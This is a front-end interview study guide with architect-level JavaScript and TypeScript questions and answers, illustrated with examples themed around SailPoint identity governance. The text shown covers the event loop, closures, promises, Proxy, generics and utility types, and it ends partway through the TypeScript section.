# JavaScript, TypeScript & Web Fundamentals

## Architect-Level Questions & Answers

> **Target Role:** Senior/Staff Front End Engineer (7+ years)
> **Focus:** Advanced JavaScript, TypeScript, Performance, Security, System Design, and Enterprise Patterns
> **Context:** SailPoint IdentityNow / IdentityIQ — Identity Governance & Administration (IGA)

---

## Table of Contents

1. [Advanced JavaScript (Q1–Q10)](#section-1-advanced-javascript)
2. [TypeScript Advanced (Q11–Q18)](#section-2-typescript-advanced)
3. [Web Performance & Core Web Vitals (Q19–Q24)](#section-3-web-performance--core-web-vitals)
4. [Web Security (Q25–Q28)](#section-4-web-security)
5. [CSS & Layout (Q29–Q33)](#section-5-css--layout)
6. [HTML & Accessibility (Q34–Q37)](#section-6-html--accessibility)
7. [Frontend System Design (Q38–Q42)](#section-7-frontend-system-design)
8. [Testing & DevOps (Q43–Q46)](#section-8-testing--devops)
9. [REST API & Data Patterns (Q47–Q50)](#section-9-rest-api--data-patterns)

---

## Section 1: Advanced JavaScript

### Q1: Explain the Event Loop, Call Stack, and the difference between Microtasks and Macrotasks. What will the following code output?

```javascript
console.log('1');

setTimeout(() => console.log('2'), 0);

Promise.resolve().then(() => console.log('3'));

queueMicrotask(() => console.log('4'));

setTimeout(() => {
  console.log('5');
  Promise.resolve().then(() => console.log('6'));
}, 0);

console.log('7');
```

**Answer:**

**Output:** `1, 7, 3, 4, 2, 5, 6`

**Detailed Explanation:**

The JavaScript runtime uses a single-threaded event loop with distinct task queues:

- **Call Stack:** Synchronous code executes here first (LIFO).
- **Microtask Queue:** Promises (`.then`, `.catch`, `.finally`), `queueMicrotask()`, `MutationObserver`. Drained completely after each macrotask.
- **Macrotask Queue:** `setTimeout`, `setInterval`, `setImmediate` (Node), I/O, UI rendering.

**Execution order:**

1. `console.log('1')` → Call stack → prints `1`
2. `setTimeout(() => log('2'), 0)` → Registers macrotask
3. `Promise.resolve().then(...)` → Queues microtask (prints `3`)
4. `queueMicrotask(...)` → Queues microtask (prints `4`)
5. `setTimeout(() => { log('5'); ... }, 0)` → Registers macrotask
6. `console.log('7')` → Call stack → prints `7`
7. **Call stack empty → Drain microtask queue:** prints `3`, then `4`
8. **Pick next macrotask:** first `setTimeout` → prints `2`
9. **Drain microtask queue:** (empty)
10. **Pick next macrotask:** second `setTimeout` → prints `5`, then queues microtask
11. **Drain microtask queue:** prints `6`

**SailPoint Context:** In IdentityNow's dashboard, understanding microtask priority is critical when orchestrating multiple API calls for identity certifications — ensuring UI updates (microtasks) happen before the next batch of network callbacks (macrotasks).

---

### Q2: Explain Closures and Scope Chain. What does this code output and why?

```javascript
function createCounter() {
  let count = 0;
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count
  };
}

const counter = createCounter();
console.log(counter.increment()); // ?
console.log(counter.increment()); // ?
console.log(counter.decrement()); // ?
console.log(counter.getCount());  // ?

// Tricky part:
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log('var loop:', i), 0);
}

for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log('let loop:', j), 0);
}
```

**Answer:**

```
1
2
1
1
var loop: 3
var loop: 3
var loop: 3
let loop: 0
let loop: 1
let loop: 2
```

**Explanation:**

A **closure** is a function that retains access to its lexical scope even after the outer function has returned. The scope chain is the hierarchy of scopes the engine traverses to resolve variable references.

- `createCounter()` returns an object whose methods close over the shared `count` variable. Each method reads/writes the same `count` in the closure.
- **`var` loop:** `var` is function-scoped, so all three callbacks share the same `i`. By the time the callbacks execute, `i` is `3`.
- **`let` loop:** `let` is block-scoped — each iteration creates a new binding of `j`, so each callback captures its own value.

**Classic fix for `var` loop (IIFE):**

```javascript
for (var i = 0; i < 3; i++) {
  (function(captured) {
    setTimeout(() => console.log('fixed:', captured), 0);
  })(i);
}
// Output: fixed: 0, fixed: 1, fixed: 2
```

**SailPoint Context:** Closures are heavily used in SailPoint's plugin architecture — each identity module (access requests, certifications, provisioning) can maintain private state via closures while exposing a controlled public API.

---

### Q3: Explain Prototypal Inheritance vs Class Inheritance in JavaScript. How does the prototype chain work?

**Answer:**

JavaScript uses **prototypal inheritance** — objects inherit directly from other objects. ES6 `class` syntax is syntactic sugar over prototypes.

```javascript
// Prototypal Inheritance
const identityBase = {
  type: 'identity',
  getInfo() {
    return `${this.name} (${this.type})`;
  }
};

const employee = Object.create(identityBase);
employee.name = 'John Doe';
employee.department = 'Engineering';
console.log(employee.getInfo()); // "John Doe (identity)"

// Prototype chain: employee → identityBase → Object.prototype → null

// ES6 Class (syntactic sugar)
class Identity {
  constructor(name) {
    this.name = name;
  }
  getInfo() {
    return `${this.name} (${this.type})`;
  }
}

class ServiceAccount extends Identity {
  constructor(name, serviceType) {
    super(name);
    this.serviceType = serviceType;
    this.type = 'service-account';
  }
}

const svc = new ServiceAccount('svc-api', 'REST');
console.log(svc.getInfo()); // "svc-api (service-account)"
console.log(svc instanceof Identity); // true
```

**Key Differences:**

| Aspect | Prototypal | Class-based (ES6) |
|--------|-----------|-------------------|
| Mechanism | `Object.create()`, `__proto__` | `class`, `extends`, `super` |
| Flexibility | Can modify prototype at runtime | More rigid structure |
| Multiple Inheritance | Mixins via `Object.assign()` | Not natively supported |
| Performance | Slightly faster (no class overhead) | Optimized by V8 engine |

**Prototype chain lookup:**
```
svc → ServiceAccount.prototype → Identity.prototype → Object.prototype → null
```

When you access `svc.getInfo()`, the engine walks up the chain until it finds the method or reaches `null`.

**SailPoint Context:** SailPoint's IdentityIQ uses Java-based inheritance models. On the frontend, understanding prototype chains is essential when extending base UI components (e.g., a base `IdentityCard` component that specialized cards like `AccessRequestCard` or `CertificationCard` inherit from).

---

### Q4: Explain `this` keyword behavior in JavaScript. How do `call`, `apply`, and `bind` work?

**Answer:**

The value of `this` depends on **how** a function is called, not where it's defined:

```javascript
// 1. Global context
console.log(this); // window (browser) or global (Node)

// 2. Object method — `this` = the object
const identity = {
  name: 'Admin',
  greet() {
    console.log(`Hello, ${this.name}`);
  }
};
identity.greet(); // "Hello, Admin"

// 3. Lost context
const greetFn = identity.greet;
greetFn(); // "Hello, undefined" (this = window/global)

// 4. Arrow functions — `this` = lexically inherited
const identity2 = {
  name: 'Admin',
  greet: () => {
    console.log(`Hello, ${this.name}`); // `this` = outer scope (window)
  },
  delayedGreet() {
    setTimeout(() => {
      console.log(`Hello, ${this.name}`); // `this` = identity2 ✓
    }, 100);
  }
};

// 5. call, apply, bind
function describeIdentity(role, department) {
  console.log(`${this.name} - ${role} - ${department}`);
}

const user = { name: 'Jane' };

// call: invokes immediately, args passed individually
describeIdentity.call(user, 'Admin', 'IT');
// "Jane - Admin - IT"

// apply: invokes immediately, args passed as array
describeIdentity.apply(user, ['Admin', 'IT']);
// "Jane - Admin - IT"

// bind: returns NEW function with `this` permanently bound
const describJane = describeIdentity.bind(user, 'Admin');
describJane('IT'); // "Jane - Admin - IT"
// bind is partial application — you can pre-fill arguments
```

**`this` Resolution Order:**

1. `new` binding → newly created object
2. Explicit binding → `call`/`apply`/`bind`
3. Implicit binding → object before the dot
4. Default binding → `window`/`global` (or `undefined` in strict mode)

**Tricky Interview Question:**
```javascript
const obj = {
  value: 42,
  getValue: function() { return this.value; },
  getValueArrow: () => this.value
};

console.log(obj.getValue());      // 42
console.log(obj.getValueArrow()); // undefined (this = window)

const { getValue } = obj;
console.log(getValue());          // undefined (lost context)
console.log(getValue.call(obj));  // 42 (explicit binding)
```

**SailPoint Context:** In SailPoint's ExtJS-based legacy UI (IdentityIQ), `this` binding issues are extremely common in event handlers and callbacks. Understanding `bind` is critical for maintaining legacy code while migrating to modern frameworks.

---

### Q5: Explain Promises, async/await, and the differences between Promise.all, Promise.allSettled, Promise.race, and Promise.any.

**Answer:**

```javascript
// Promise basics
const fetchIdentity = (id) => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (id > 0) resolve({ id, name: `User_${id}` });
    else reject(new Error('Invalid ID'));
  }, 100);
});

// async/await — syntactic sugar over Promises
async function getIdentityDetails(id) {
  try {
    const identity = await fetchIdentity(id);
    const entitlements = await fetchEntitlements(identity.id);
    return { ...identity, entitlements };
  } catch (error) {
    console.error('Failed to fetch identity:', error);
    throw error;
  }
}

// Promise.all — fails fast on ANY rejection
const ids = [1, 2, 3];
try {
  const identities = await Promise.all(
    ids.map(id => fetchIdentity(id))
  );
  // All resolved: [{ id:1, ... }, { id:2, ... }, { id:3, ... }]
} catch (err) {
  // If ANY one fails, entire Promise.all rejects
}
```

```javascript
// Promise.allSettled — waits for ALL, never short-circuits
const results = await Promise.allSettled([
  fetchIdentity(1),
  fetchIdentity(-1), // will reject
  fetchIdentity(3)
]);
// results = [
//   { status: 'fulfilled', value: { id: 1, name: 'User_1' } },
//   { status: 'rejected', reason: Error('Invalid ID') },
//   { status: 'fulfilled', value: { id: 3, name: 'User_3' } }
// ]

// Promise.race — resolves/rejects with the FIRST settled promise
const fastest = await Promise.race([
  fetchFromPrimary(),   // 200ms
  fetchFromSecondary()  // 100ms ← wins
]);

// Promise.any — resolves with FIRST fulfilled (ignores rejections)
const firstSuccess = await Promise.any([
  fetchFromCacheServer(),    // rejects
  fetchFromPrimaryAPI(),     // resolves in 200ms ← wins
  fetchFromFallbackAPI()     // resolves in 500ms
]);
// If ALL reject → AggregateError
```

| Method | Short-circuits? | On rejection | Use case |
|--------|----------------|--------------|----------|
| `Promise.all` | Yes (on first reject) | Rejects immediately | All must succeed |
| `Promise.allSettled` | No | Includes in results | Need all results regardless |
| `Promise.race` | Yes (first settled) | If first is rejection | Timeout patterns |
| `Promise.any` | Yes (first fulfilled) | Only if ALL reject | Fastest success wins |

**SailPoint Context:** When loading an identity's dashboard, you might use `Promise.allSettled` to fetch access items, certifications, and activity logs in parallel — showing partial data even if one API fails, rather than blocking the entire page.

---

### Q6: Implement Debounce and Throttle from scratch. Explain when to use each.

**Answer:**

```javascript
// DEBOUNCE: Delays execution until after a pause in calls
// Use case: Search input — wait until user stops typing
function debounce(fn, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      fn.apply(this, args);
    }, delay);
  };
}

// Advanced debounce with leading/trailing edge and cancel
function advancedDebounce(fn, delay, { leading = false, trailing = true } = {}) {
  let timeoutId;
  let lastArgs;

  const debounced = function(...args) {
    lastArgs = args;
    const shouldCallNow = leading && !timeoutId;

    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      timeoutId = null;
      if (trailing && lastArgs) {
        fn.apply(this, lastArgs);
        lastArgs = null;
      }
    }, delay);

    if (shouldCallNow) {
      fn.apply(this, args);
      lastArgs = null;
    }
  };

  debounced.cancel = () => {
    clearTimeout(timeoutId);
    timeoutId = null;
    lastArgs = null;
  };

  return debounced;
}
```

```javascript
// THROTTLE: Ensures function runs at most once per interval
// Use case: Scroll events, resize handlers, API rate limiting
function throttle(fn, interval) {
  let lastTime = 0;
  let timeoutId;

  return function(...args) {
    const now = Date.now();
    const remaining = interval - (now - lastTime);

    if (remaining <= 0) {
      clearTimeout(timeoutId);
      timeoutId = null;
      lastTime = now;
      fn.apply(this, args);
    } else if (!timeoutId) {
      timeoutId = setTimeout(() => {
        lastTime = Date.now();
        timeoutId = null;
        fn.apply(this, args);
      }, remaining);
    }
  };
}

// Usage in SailPoint context
const searchIdentities = debounce(async (query) => {
  const results = await fetch(
    `/api/v3/search?query=${encodeURIComponent(query)}&type=identity`
  );
  renderResults(await results.json());
}, 300);

const handleTableScroll = throttle((event) => {
  loadMoreEntitlements(event.target.scrollTop);
}, 200);

document.getElementById('identity-search').addEventListener('input', (e) => {
  searchIdentities(e.target.value);
});
```

| Aspect | Debounce | Throttle |
|--------|----------|----------|
| Execution | After pause in calls | At regular intervals |
| Use case | Search input, form validation | Scroll, resize, mousemove |
| Guarantees | Runs once after last call | Runs at most once per interval |

---

### Q7: Explain Deep Clone vs Shallow Clone in JavaScript. What are the pitfalls?

**Answer:**

```javascript
// SHALLOW CLONE — copies only top-level properties
const original = {
  name: 'Admin Role',
  permissions: ['read', 'write'],
  metadata: { created: '2024-01-01' }
};

// Methods for shallow clone:
const shallow1 = { ...original };
const shallow2 = Object.assign({}, original);

shallow1.permissions.push('delete');
console.log(original.permissions); // ['read', 'write', 'delete'] ← MUTATED!

// DEEP CLONE — recursively copies all nested objects
// Method 1: structuredClone (modern, recommended)
const deep1 = structuredClone(original);

// Method 2: JSON parse/stringify (limitations!)
const deep2 = JSON.parse(JSON.stringify(original));
// ⚠️ Loses: functions, undefined, Symbol, Date→string, RegExp, Map, Set, circular refs

// Method 3: Custom deep clone (handles edge cases)
function deepClone(obj, seen = new WeakMap()) {
  if (obj === null || typeof obj !== 'object') return obj;
  if (seen.has(obj)) return seen.get(obj); // circular reference

  if (obj instanceof Date) return new Date(obj);
  if (obj instanceof RegExp) return new RegExp(obj);
  if (obj instanceof Map) {
    const map = new Map();
    seen.set(obj, map);
    obj.forEach((v, k) => map.set(deepClone(k, seen), deepClone(v, seen)));
    return map;
  }
  if (obj instanceof Set) {
    const set = new Set();
    seen.set(obj, set);
    obj.forEach(v => set.add(deepClone(v, seen)));
    return set;
  }

  const clone = Array.isArray(obj) ? [] : {};
  seen.set(obj, clone);
  for (const key of Reflect.ownKeys(obj)) {
    clone[key] = deepClone(obj[key], seen);
  }
  return clone;
}
```

| Method | Circular Refs | Functions | Date/RegExp | Performance |
|--------|:---:|:---:|:---:|:---:|
| `{ ...obj }` | ❌ | ✅ (ref) | ❌ (ref) | Fastest |
| `JSON.parse(JSON.stringify())` | ❌ Throws | ❌ Lost | ❌ Converted | Slow |
| `structuredClone()` | ✅ | ❌ Throws | ✅ | Good |
| Custom recursive | ✅ | ✅ | ✅ | Varies |

**SailPoint Context:** When duplicating access profiles or role configurations in IdentityNow's admin UI, deep cloning is essential to avoid accidentally mutating the original policy while editing a copy. `structuredClone` is the go-to for modern browsers.

---

### Q8: What are WeakMap and WeakSet? When would you use them?

**Answer:**

`WeakMap` and `WeakSet` hold **weak references** to objects — they don't prevent garbage collection.

```javascript
// WeakMap: keys must be objects, values can be anything
// Keys are weakly held — if no other reference exists, GC can collect them

// Use case 1: Private data for objects (without leaking memory)
const privateData = new WeakMap();

class IdentitySession {
  constructor(userId, token) {
    privateData.set(this, { token, loginTime: Date.now() });
    this.userId = userId;
  }

  getToken() {
    return privateData.get(this).token;
  }

  getSessionDuration() {
    const { loginTime } = privateData.get(this);
    return Date.now() - loginTime;
  }
}

const session = new IdentitySession('user123', 'jwt-token-xyz');
console.log(session.getToken()); // 'jwt-token-xyz'
console.log(session.token);      // undefined (truly private!)
// When `session` is GC'd, the WeakMap entry is automatically removed
```javascript
// Use case 2: Caching computed results without memory leaks
const computeCache = new WeakMap();

function getEntitlementSummary(identity) {
  if (computeCache.has(identity)) return computeCache.get(identity);

  const summary = expensiveComputation(identity);
  computeCache.set(identity, summary);
  return summary;
}
// When identity object is GC'd, cache entry is auto-cleaned

// Use case 3: DOM element metadata
const elementMeta = new WeakMap();
document.querySelectorAll('.identity-card').forEach(el => {
  elementMeta.set(el, { clickCount: 0, lastInteraction: null });
});
// When DOM elements are removed, metadata is auto-cleaned

// WeakSet: stores objects, no duplicates, weakly held
const processedIdentities = new WeakSet();

function processIdentity(identity) {
  if (processedIdentities.has(identity)) {
    console.log('Already processed');
    return;
  }
  processedIdentities.add(identity);
  // ... process identity
}
```

| Feature | Map | WeakMap | Set | WeakSet |
|---------|-----|---------|-----|---------|
| Key types | Any | Objects only | Any | Objects only |
| Iterable | ✅ | ❌ | ✅ | ❌ |
| `.size` | ✅ | ❌ | ✅ | ❌ |
| GC-friendly | ❌ | ✅ | ❌ | ✅ |
| Use case | General cache | Private data, DOM meta | Unique values | Tracking processed items |

**SailPoint Context:** In a long-running SPA like IdentityNow, memory leaks are a real concern. WeakMaps are ideal for caching identity data that should be cleaned up when the user navigates away from a view.

---

### Q9: Explain Generators and Iterators in JavaScript. When are they useful?

**Answer:**

**Iterators** follow the Iterator Protocol — an object with a `next()` method returning `{ value, done }`. **Generators** are functions that can pause and resume execution using `yield`.

```javascript
// Custom Iterator
function createIdentityIterator(identities) {
  let index = 0;
  return {
    next() {
      if (index < identities.length) {
        return { value: identities[index++], done: false };
      }
      return { value: undefined, done: true };
    },
    [Symbol.iterator]() { return this; }
  };
}

const iter = createIdentityIterator(['Alice', 'Bob', 'Charlie']);
console.log(iter.next()); // { value: 'Alice', done: false }
console.log(iter.next()); // { value: 'Bob', done: false }

// Generator function (much cleaner)
function* identityGenerator(identities) {
  for (const identity of identities) {
    yield identity;
  }
}

// Infinite sequence generator
function* idGenerator(prefix = 'IDN') {
  let id = 1;
  while (true) {
    yield `${prefix}-${String(id++).padStart(6, '0')}`;
  }
}

const ids = idGenerator();
console.log(ids.next().value); // "IDN-000001"
console.log(ids.next().value); // "IDN-000002"
```javascript
// Async Generator — paginated API fetching
async function* fetchAllIdentities(pageSize = 50) {
  let offset = 0;
  let hasMore = true;

  while (hasMore) {
    const response = await fetch(
      `/api/v3/identities?limit=${pageSize}&offset=${offset}`
    );
    const data = await response.json();

    for (const identity of data.items) {
      yield identity;
    }

    offset += pageSize;
    hasMore = data.items.length === pageSize;
  }
}

// Usage — process identities one at a time without loading all into memory
for await (const identity of fetchAllIdentities()) {
  await processIdentity(identity);
  if (identity.riskScore > 90) {
    break; // Can stop early!
  }
}

// Generator for state machine
function* certificationWorkflow() {
  const review = yield 'PENDING_REVIEW';
  const decision = yield 'IN_REVIEW';
  if (decision === 'approve') {
    yield 'APPROVED';
  } else {
    const escalation = yield 'ESCALATED';
    yield escalation === 'override' ? 'APPROVED' : 'DENIED';
  }
}
```

**SailPoint Context:** Generators are perfect for paginating through SailPoint's V3 APIs which return paginated results. An async generator can lazily fetch identity lists, entitlements, or certification items without loading thousands of records into memory at once.

---

### Q10: Explain the Proxy and Reflect API. What are practical use cases?

**Answer:**

`Proxy` creates a wrapper around an object that intercepts fundamental operations (get, set, delete, etc.). `Reflect` provides default implementations of those operations.

```javascript
// Basic Proxy — validation and logging
const identityValidator = new Proxy({}, {
  set(target, property, value, receiver) {
    // Validation rules
    if (property === 'email' && !value.includes('@')) {
      throw new TypeError('Invalid email address');
    }
    if (property === 'riskScore' && (value < 0 || value > 100)) {
      throw new RangeError('Risk score must be 0-100');
    }

    console.log(`Setting ${property} = ${value}`);
    return Reflect.set(target, property, value, receiver);
  },

  get(target, property, receiver) {
    if (!(property in target)) {
      console.warn(`Property "${property}" not found on identity`);
      return undefined;
    }
    return Reflect.get(target, property, receiver);
  },

  deleteProperty(target, property) {
    if (property === 'id') {
      throw new Error('Cannot delete identity ID');
    }
    return Reflect.deleteProperty(target, property);
  }
});

identityValidator.email = 'admin@sailpoint.com'; // ✅
identityValidator.riskScore = 75;                 // ✅
// identityValidator.email = 'invalid';           // ❌ TypeError
// identityValidator.riskScore = 150;             // ❌ RangeError
```javascript
// Reactive state management (Vue 3 uses this internally)
function reactive(obj) {
  const handlers = new Set();

  return new Proxy(obj, {
    set(target, property, value) {
      const oldValue = target[property];
      const result = Reflect.set(target, property, value);
      if (oldValue !== value) {
        handlers.forEach(fn => fn(property, value, oldValue));
      }
      return result;
    },
    get(target, property) {
      if (property === 'subscribe') {
        return (fn) => { handlers.add(fn); return () => handlers.delete(fn); };
      }
      return Reflect.get(target, property);
    }
  });
}

const state = reactive({ identityCount: 0, lastSync: null });
state.subscribe((prop, newVal) => console.log(`${prop} changed to ${newVal}`));
state.identityCount = 42; // logs: "identityCount changed to 42"

// API response caching with Proxy
function createCachedAPI(ttl = 60000) {
  const cache = new Map();

  return new Proxy({}, {
    get(target, endpoint) {
      return async (...args) => {
        const key = `${endpoint}:${JSON.stringify(args)}`;
        const cached = cache.get(key);

        if (cached && Date.now() - cached.timestamp < ttl) {
          return cached.data;
        }

        const data = await fetch(`/api/v3/${endpoint}`, ...args)
          .then(r => r.json());
        cache.set(key, { data, timestamp: Date.now() });
        return data;
      };
    }
  });
}

const api = createCachedAPI(30000);
await api.identities({ limit: 50 }); // fetches
await api.identities({ limit: 50 }); // returns cached
```

**SailPoint Context:** Proxies are powerful for building form validation layers in SailPoint's admin console — enforcing business rules (e.g., governance policies, entitlement constraints) at the data model level before any API call is made.

---

## Section 2: TypeScript Advanced

### Q11: Explain Generics with Constraints in TypeScript. How do you use them in real-world scenarios?

**Answer:**

Generics allow writing reusable, type-safe code. Constraints (`extends`) limit what types can be passed.

```typescript
// Basic generic function
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}

const identity = { name: 'Alice', riskScore: 75, department: 'Engineering' };
const name = getProperty(identity, 'name');       // type: string
const score = getProperty(identity, 'riskScore');  // type: number
// getProperty(identity, 'invalid');               // ❌ Compile error

// Generic with constraint
interface HasId {
  id: string;
}

function mergeById<T extends HasId>(items: T[], updates: Partial<T> & HasId): T[] {
  return items.map(item =>
    item.id === updates.id ? { ...item, ...updates } : item
  );
}

// Generic API response wrapper
interface ApiResponse<T> {
  data: T;
  count: number;
  offset: number;
  limit: number;
}

interface Identity {
  id: string;
  name: string;
  email: string;
  riskScore: number;
  entitlements: string[];
}

async function fetchPaginated<T extends HasId>(
  endpoint: string,
  params?: Record<string, string>
): Promise<ApiResponse<T[]>> {
  const query = new URLSearchParams(params).toString();
  const response = await fetch(`/api/v3/${endpoint}?${query}`);
  return response.json();
}

// Usage — fully typed!
const result = await fetchPaginated<Identity>('identities', { limit: '50' });
result.data[0].riskScore; // ✅ TypeScript knows this is number
```

```typescript
// Generic class for state management
class Store<S extends Record<string, unknown>> {
  private state: S;
  private listeners = new Set<(state: S) => void>();

  constructor(initialState: S) {
    this.state = { ...initialState };
  }

  getState(): Readonly<S> {
    return Object.freeze({ ...this.state });
  }

  setState<K extends keyof S>(key: K, value: S[K]): void {
    this.state = { ...this.state, [key]: value };
    this.listeners.forEach(fn => fn(this.state));
  }

  subscribe(listener: (state: S) => void): () => void {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }
}

// Fully typed store
const identityStore = new Store({
  identities: [] as Identity[],
  loading: false,
  error: null as string | null,
  selectedId: null as string | null
});

identityStore.setState('loading', true);     // ✅
// identityStore.setState('loading', 'yes'); // ❌ Type error: string ≠ boolean
```

**SailPoint Context:** SailPoint's IdentityNow API is strongly typed. Generic wrappers around API calls ensure that identity objects, access profiles, roles, and entitlements are all type-safe throughout the frontend codebase.

---

### Q12: Explain TypeScript Utility Types with practical examples.

**Answer:**

```typescript
interface AccessProfile {
  id: string;
  name: string;
  description: string;
  sourceId: string;
  entitlements: string[];
  owner: { id: string; name: string };
  enabled: boolean;
  created: Date;
  modified: Date;
}

// Partial<T> — all properties optional (for updates)
type AccessProfileUpdate = Partial<AccessProfile>;
const update: AccessProfileUpdate = { name: 'New Name' }; // ✅

// Required<T> — all properties required
type StrictAccessProfile = Required<AccessProfile>;

// Pick<T, K> — select specific properties
type AccessProfileSummary = Pick<AccessProfile, 'id' | 'name' | 'enabled'>;

// Omit<T, K> — exclude specific properties
type AccessProfileCreate = Omit<AccessProfile, 'id' | 'created' | 'modified'>;

// Record<K, V> — construct object type with key type K and value type V
type EntitlementMap = Record<string, { name: string; source: string }>;
const entitlements: EntitlementMap = {
  'ent-001': { name: 'Admin Access', source: 'Active Directory' },
  'ent-002': { name: 'Read Only', source: 'Salesforce' }
};

// Exclude<T, U> — remove types from union
type AllStatuses = 'active' | 'inactive' | 'pending' | 'deleted';
type VisibleStatuses = Exclude<AllStatuses, 'deleted'>; // 'active' | 'inactive' | 'pending'

// Extract<T, U> — keep only matching types
type ActiveStatuses = Extract<AllStatuses, 'active' | 'pending'>; // 'active' | 'pending'

// NonNullable<T> — remove null and undefined
type MaybeString = string | null | undefined;
type DefiniteString = NonNullable<MaybeString>; // string
```typescript
// ReturnType<T> — extract return type of a function
declare function fetchIdentity(id: string): Promise<Identity>;
type FetchResult = ReturnType<typeof fetchIdentity>; // Promise<Identity>

// Parameters<T> — extract parameter types
type FetchParams = Parameters<typeof fetchIdentity>; // [id: string]

// Readonly<T> — make all properties readonly
type FrozenProfile = Readonly<AccessProfile>;
const frozen: FrozenProfile = { /* ... */ } as FrozenProfile;
// frozen.name = 'test'; // ❌ Cannot assign to 'name' because it is a read-only property

// Combining utility types — real-world pattern
type CreateAccessProfile = Omit<AccessProfile, 'id' | 'created' | 'modified'> & {
  requestedFor?: string[];
};

type PatchAccessProfile = Partial<Omit<AccessProfile, 'id' | 'created'>> & {
  id: string; // id is required for patch
};
```

**SailPoint Context:** These utility types map directly to SailPoint API patterns — `Omit` for create payloads (no id/timestamps), `Partial` for PATCH updates, `Pick` for list views showing only summary fields.

---

### Q13: Explain Conditional Types and the `infer` keyword in TypeScript.

**Answer:**

Conditional types enable type-level if/else logic. `infer` extracts types within conditional type expressions.

```typescript
// Basic conditional type
type IsString<T> = T extends string ? 'yes' : 'no';
type A = IsString<string>;  // 'yes'
type B = IsString<number>;  // 'no'

// Practical: Unwrap Promise type
type UnwrapPromise<T> = T extends Promise<infer U> ? U : T;
type X = UnwrapPromise<Promise<Identity>>;  // Identity
type Y = UnwrapPromise<string>;             // string

// Unwrap array type
type UnwrapArray<T> = T extends (infer U)[] ? U : T;
type Element = UnwrapArray<Identity[]>;     // Identity
```typescript
// Extract function return type (manual implementation of ReturnType)
type MyReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

// Extract first argument type
type FirstArg<T> = T extends (first: infer F, ...rest: any[]) => any ? F : never;
type FA = FirstArg<(id: string, name: string) => void>; // string

// Distributive conditional types — applied to each member of a union
type ToArray<T> = T extends any ? T[] : never;
type Result = ToArray<string | number>; // string[] | number[]

// Non-distributive (wrap in tuple)
type ToArrayND<T> = [T] extends [any] ? T[] : never;
type Result2 = ToArrayND<string | number>; // (string | number)[]

// Real-world: API response type resolver
type ApiEndpoints = {
  '/identities': Identity[];
  '/identities/:id': Identity;
  '/access-profiles': AccessProfile[];
  '/certifications': Certification[];
};

type ApiResponse2<E extends keyof ApiEndpoints> = {
  data: ApiEndpoints[E];
  status: number;
  headers: Record<string, string>;
};

// Infer path parameters
type ExtractParams<T extends string> =
  T extends `${string}:${infer Param}/${infer Rest}`
    ? Param | ExtractParams<Rest>
    : T extends `${string}:${infer Param}`
      ? Param
      : never;

type Params = ExtractParams<'/api/v3/identities/:id/access/:accessId'>;
// type Params = 'id' | 'accessId'
```

**SailPoint Context:** Conditional types with `infer` are powerful for building type-safe API clients for SailPoint's REST APIs — automatically inferring response types from endpoint paths and extracting path parameters.

---

### Q14: Explain Mapped Types and Template Literal Types in TypeScript.

**Answer:**

```typescript
// MAPPED TYPES — transform properties of an existing type

// Make all properties optional and nullable
type Nullable<T> = { [K in keyof T]: T[K] | null };

// Make all properties readonly with a prefix
type ReadonlyIdentity = { readonly [K in keyof Identity as `readonly_${K}`]: Identity[K] };

// Create getters for all properties
type Getters<T> = {
  [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K];
};

type IdentityGetters = Getters<{ name: string; riskScore: number }>;
// { getName: () => string; getRiskScore: () => number }

// Remove specific properties via filtering
type RemoveReadonly<T> = {
  [K in keyof T as K extends `readonly_${string}` ? never : K]: T[K];
};

// TEMPLATE LITERAL TYPES — string manipulation at type level
type EventName = 'click' | 'focus' | 'blur';
type EventHandler = `on${Capitalize<EventName>}`;
// 'onClick' | 'onFocus' | 'onBlur'

// API endpoint builder
type ApiVersion = 'v2' | 'v3';
type Resource = 'identities' | 'access-profiles' | 'roles' | 'certifications';
type Endpoint = `/api/${ApiVersion}/${Resource}`;
// '/api/v2/identities' | '/api/v2/access-profiles' | ... (all combinations)

// CSS property type
type CSSUnit = 'px' | 'rem' | 'em' | '%' | 'vh' | 'vw';
type CSSValue = `${number}${CSSUnit}`;
const width: CSSValue = '100px';   // ✅
// const bad: CSSValue = '100';    // ❌
```typescript
// Real-world: Type-safe event emitter
type EventMap = {
  identityCreated: { id: string; name: string };
  identityDeleted: { id: string };
  certificationCompleted: { certId: string; decision: 'approve' | 'revoke' };
};

class TypedEventEmitter<T extends Record<string, any>> {
  private handlers = new Map<keyof T, Set<Function>>();

  on<K extends keyof T>(event: K, handler: (payload: T[K]) => void): void {
    if (!this.handlers.has(event)) this.handlers.set(event, new Set());
    this.handlers.get(event)!.add(handler);
  }

  emit<K extends keyof T>(event: K, payload: T[K]): void {
    this.handlers.get(event)?.forEach(fn => fn(payload));
  }
}

const emitter = new TypedEventEmitter<EventMap>();
emitter.on('identityCreated', (payload) => {
  console.log(payload.name); // ✅ TypeScript knows payload shape
});
// emitter.emit('identityCreated', { id: '1' }); // ❌ Missing 'name'
```

**SailPoint Context:** Template literal types are excellent for modeling SailPoint's REST API endpoints, ensuring that only valid endpoint combinations are used in the codebase. Mapped types help create form state types from API response types.

---

### Q15: Explain Type Guards and Discriminated Unions in TypeScript.

**Answer:**

```typescript
// DISCRIMINATED UNIONS — each variant has a common literal "tag" property
interface AccessRequestEvent {
  type: 'access-request';
  requestId: string;
  requestedItems: string[];
  requester: string;
}

interface CertificationEvent {
  type: 'certification';
  certId: string;
  reviewer: string;
  decision: 'approve' | 'revoke' | 'reassign';
}

interface ProvisioningEvent {
  type: 'provisioning';
  accountId: string;
  source: string;
  action: 'create' | 'update' | 'delete';
}

type GovernanceEvent = AccessRequestEvent | CertificationEvent | ProvisioningEvent;
```typescript
// Exhaustive switch with discriminated union
function handleEvent(event: GovernanceEvent): string {
  switch (event.type) {
    case 'access-request':
      return `Request ${event.requestId} by ${event.requester}`;
    case 'certification':
      return `Cert ${event.certId}: ${event.decision} by ${event.reviewer}`;
    case 'provisioning':
      return `${event.action} account ${event.accountId} on ${event.source}`;
    default:
      // Exhaustiveness check — if you add a new event type and forget
      // to handle it, TypeScript will error here
      const _exhaustive: never = event;
